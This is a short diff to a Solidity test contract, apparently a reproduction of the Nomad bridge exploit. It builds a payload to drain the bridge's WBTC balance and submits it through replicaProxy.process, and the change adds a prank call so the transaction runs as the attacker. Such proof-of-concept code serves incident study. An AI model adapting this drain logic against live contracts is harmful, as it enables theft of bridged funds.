@@ -126,7 +126,8 @@ contract Exploit_Nomad is TestHarness {
         
         bytes memory payload = getPayload(attacker, address(WBTC), WBTC.balanceOf(ercBridge));
         emit log_named_bytes("\nTx Payload", payload); 
-
+        
+        cheat.prank(attacker);
         bool success = replicaProxy.process(payload);
         require(success, "Process failed");
 
